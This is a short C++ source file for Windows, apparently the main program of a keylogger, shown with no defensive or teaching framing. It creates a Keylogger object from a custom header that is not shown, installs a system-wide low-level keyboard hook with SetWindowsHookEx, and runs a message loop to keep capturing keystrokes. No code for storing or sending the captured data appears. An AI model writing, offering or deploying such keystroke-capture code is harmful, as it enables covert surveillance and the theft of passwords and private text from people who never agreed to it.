#include <windows.h>
#include <iostream>
#include <keylogger.h>

#pragma comment(lib, "User32.lib")

int main(int argc, char* argv[]) {
    Keylogger kl;

    HHOOK hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        kl.KBHook,
        GetModuleHandle(NULL),
        0
    );

    if (hKeyboardHook == NULL) std::cerr << "Kb Hook Installation Failed: " << GetLastError() << std::endl;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg); 
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}